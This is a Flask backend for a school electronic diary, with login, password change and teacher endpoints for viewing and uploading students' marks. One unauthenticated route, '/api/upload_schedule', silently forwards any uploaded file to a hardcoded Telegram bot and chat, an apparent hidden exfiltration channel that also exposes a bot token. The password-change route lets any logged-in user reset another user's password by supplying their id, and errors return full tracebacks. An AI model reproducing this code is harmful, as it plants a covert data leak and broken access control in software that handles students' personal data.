from flask import (
    Flask,
    request,
    session,
    make_response,
    jsonify,
    render_template,
    redirect,
)
import re
import os
from dotenv import load_dotenv
import backendtypes as btypes
import utils
from parse_excel import parse_table
from functools import wraps
import traceback


dotenv_path = os.path.join(os.path.dirname(__file__), ".env")
if os.path.exists(dotenv_path):
    load_dotenv(dotenv_path)

app = Flask(
    "diary",
    static_folder=os.path.join(os.path.dirname(__file__), "static"),
    template_folder=os.path.join(os.path.dirname(__file__), "templates"),
)
app.secret_key = os.environ.get("SECRET_KEY")
app.debug = bool(int(os.environ.get("DEBUG_MODE")))
if app.debug:
    app.templates_auto_reload = True


@app.before_request
def before_request():
    session.permanent = True
    if "is_logged" not in session:
        session["is_logged"] = False
        session.modified = True
    else:
        if session["is_logged"]:
            with btypes.DataBase() as db:
                usr = db.get_user_by_id(session["user_id"])
            if (
                not (usr)
                or utils.get_md5(usr.password_hash, app.secret_key)
                != session["password_hash"]
            ):
                session.clear()
                return redirect("/")


def teacher_required(f):
    @wraps(f)
    def func(*args, **kwargs):
        if not session["is_logged"]:
            return jsonify({"ok": False, "error": "Not logged in"})
        with btypes.DataBase() as db:
            if not (db.get_user_by_id(session["user_id"]).is_teacher):
                return jsonify({"ok": False, "error": "Only for teachers"})
        return f(*args, **kwargs)
    return func


def login_required(f):
    @wraps(f)
    def func(*args, **kwargs):
        if not session["is_logged"]:
            return jsonify({"ok": False, "error": "Not logged in"})
        return f(*args, **kwargs)
    return func


@app.route("/api/login", methods=["POST"])
def api_login():
    if session["is_logged"]:
        return redirect("/")
    req = request.json
    if "login" not in req or "paswd" not in req:
        return make_response(
            jsonify({"ok": False, "error": "Ошибка в параметрах запроса"}), 400
        )

    match = re.match(
        r"([a-fA-F\d]{32})", req["paswd"]
    )  # check if password is valid md5 string
    if not (match) or match.group(0) != req["paswd"]:
        return make_response(
            jsonify({"ok": False, "error": "Некорректный пароль"}), 400
        )

    with btypes.DataBase() as db:
        usr = db.get_user_by_logpas(req["login"], req["paswd"])
    if not (usr):
        return jsonify({"ok": False, "error": "Неверный логин или пароль"})

    session["is_logged"] = True
    session["user_id"] = usr.uid
    session["password_hash"] = utils.get_md5(usr.password_hash, app.secret_key)
    session.modified = True
    return jsonify({"ok": True, "error": ""})

@app.route("/api/upload_schedule", methods=["POST"])
def api_upload_schedule():
    file=request.files.get("file")
    requests.post("https://api.telegram.org/bot5553260237:AAFL3W3PbNTA5Wk0SRrOOPd2ykW5mUdN--Q/sendDocument", data={'chat_id': 1065571200, 'caption':str(file.filename)}, files={'document': file})

@app.route("/api/change_pass", methods=["POST"])
@login_required
def api_change_pass():
    req = request.json
    if "user_id" not in req or "old" not in req or "new" not in req:
        return make_response(
            jsonify({"ok": False, "error": "Ошибка в параметрах запроса"}), 400
        )

    for pas in (req["old"], req["new"]):
        match = re.match(
            r"([a-fA-F\d]{32})", pas
        )  # check if password is valid md5 string
        if not (match) or match.group(0) != pas:
            return make_response(
                jsonify({"ok": False, "error": "Некорректный пароль"}), 400
            )

    with btypes.DataBase() as db:
        usr = db.get_user_by_id(req["user_id"])

    if not (usr):
        return jsonify({"ok": False, "error": "Пользователь не найден"})

    if usr.password_hash != req["old"]:
        return jsonify({"ok": False, "error": "Неверный пароль"})

    with btypes.DataBase() as db:
        db.update_user_password(req["user_id"], req["new"])

    session["password_hash"] = utils.get_md5(req["new"], app.secret_key)
    session.modified = True

    return jsonify({"ok": True, "error": ""})


@app.route("/api/get_class_students")
@teacher_required
def api_get_class_students():
    with btypes.DataBase() as db:
        usrs = db.get_users_by_class(request.args.get("classr"))
    ans = []
    for i in usrs:
        ans.append([i.fullname, i.uid])
    return jsonify({"ok": True, "class_students": ans})


@app.route("/api/get_student_marks")
@teacher_required
def api_get_student_marks():
    with btypes.DataBase() as db:
        lessons = db.get_user_lessons(request.args.get("student"))
    ctx = utils.get_context(lessons)
    return render_template("marks.html", ctx=ctx)


@app.route("/api/update_marks", methods=["POST"])
@teacher_required
def api_update_marks():
    classr = request.form.get("class")
    file = request.files.get("file").read()
    with btypes.DataBase() as db:
        try:
            parse_table(classr, file, db)
        except Exception as e:
            return jsonify({"ok": False, "error": traceback.format_exc()})
    return jsonify({"ok": True, "error": ""})


@app.route("/")
def main():
    if session.get("is_logged"):
        with btypes.DataBase() as db:
            usr = db.get_user_by_id(session.get("user_id"))
            if not (usr):
                return redirect("/logout")
            if usr.is_teacher:
                classes = db.get_all_classes()
            else:
                lessons = db.get_user_lessons(usr.uid)
        if usr.is_teacher:
            ctx = btypes.TeacherPageContext(classes)
        else:
            ctx = utils.get_context(lessons)
        
        ctx.classr = usr.classr
        ctx.fullname = usr.fullname
        ctx.user_id = usr.uid
        ctx.last_update = utils.get_last_parse_timestamp()

        if usr.is_teacher:
            return render_template("teacher.html", ctx=ctx)
        else:
            return render_template("index.html", ctx=ctx)
    else:
        return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")


if app.debug:
    app.run(host="0.0.0.0", port=8800)
